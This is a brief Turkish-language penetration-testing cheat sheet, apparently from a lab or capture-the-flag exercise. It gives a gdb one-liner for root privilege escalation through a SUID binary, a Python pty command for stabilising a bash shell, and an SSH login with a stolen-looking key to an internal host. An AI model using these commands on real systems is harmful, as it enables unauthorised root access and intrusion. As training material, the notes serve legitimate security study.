- SUID ile yetki yükseltme komutu
```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash -p' -ex quit
```

- Stabil bash kabuk alma
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Pseudo-Terminal olsa bile SSH bağlantısı kurma
```bash
ssh -tt -i id_rsa_nfs user@nfs.altay.sec
```